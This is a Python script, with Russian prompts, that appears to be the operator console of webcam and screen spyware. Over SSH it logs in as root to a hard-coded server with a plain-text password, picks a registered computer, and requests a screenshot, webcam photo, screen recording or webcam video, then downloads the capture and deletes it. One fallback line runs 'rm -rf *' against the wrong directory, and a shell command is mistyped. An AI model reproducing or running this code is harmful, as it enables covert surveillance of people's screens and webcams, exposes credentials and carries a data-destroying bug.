import paramiko
import time

host = '89.223.66.96' #! Айпи сервера
user = 'root' 
password = 'kt+Kkm8WHJM.DV'
port = 22

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(hostname=host, username=user, password=password, port=port)


stdin, stdout, stderr = client.exec_command('ls /home/fletbot/computers') 
lst = [i for i in str(stdout.read())[2:-1].split('\\n') if len(i) > 0]
for i in range(len(lst)):
    print(i + 1, lst[i])

while True:
    try:
        comp = input()
        if int(comp) > len(lst) or int(comp) < 1:
            print('Ошибка')
            continue
        break
    except Exception:
        print('Введите число еще раз')


print('1 - скриншот\n2 - фото с вебки\n3 - запись экрана\n4 - видео с вебки')

while True:
    try:
        req = int(input())
        if req < 1 or req > 4:
            print('Ошибка')
            continue
        break
    except Exception:
        print('Введите число еще раз')

stdin, stdout, stderr = client.exec_command('ls /home/fletbot/requests/')
stdout = str(stdout.read())[2:-1].split('\\n')
reqs = [i for i in stdout if lst[int(comp) - 1] in i]

if len(reqs) == 0:
    path = f'/home/fletbot/requests/{lst[int(comp) - 1]}'
else:
    path = f'/home/fletbot/requests/{lst[int(comp) - 1]}_{len(reqs)}_'

if req == 1:
    get = 'screenshot'
elif req == 2:
    get = 'webshot'
elif req == 3:
    get = 'screenmovie'
elif req == 4:
    get = 'webmovie'

client.exec_command(f'touch {path}.txt')
ssh = client.open_sftp()
file = ssh.open(f'{path}.txt', 'w')
file.write(get)
file.close()
ssh.close()

if get == 'screenshot':
    for i in range(60):
        _, stdout, _ = client.exec_command('ls /home/fletbot/materials/')
        stdout = str(stdout.read())[2:-1].split('\\n')
        if f'{lst[int(comp) - 1]}.png' in stdout:
            break
        time.sleep(1)
        print(i)
    else:
        client.exec_command('rm -rf * /home/fletbot/materials/')
    
    stdin, stdout, stderr = client.exec_command('ls /home/fletbot/materials/')
    lsdir = [i for i in str(stdout.read())[2:-1].split('\\n') if i != '']
    ssh = client.open_sftp()
    file = ssh.open(f'/home/fletbot/materials/{lsdir[0]}', 'rb')
    photo = open(lsdir[0], 'wb')
    photo.write(file.read())
    photo.close()
    file.close()
    photo = lsdir[0]
    print(photo)
    terminal = client.invoke_shell()
    terminal.send('ccd /home/fletbot/materials')
    terminal.send(f'rm -rf {lsdir[0]}')
    client.exec_command(f'rm -rf /home/fletbot/materials/{lsdir[0]}')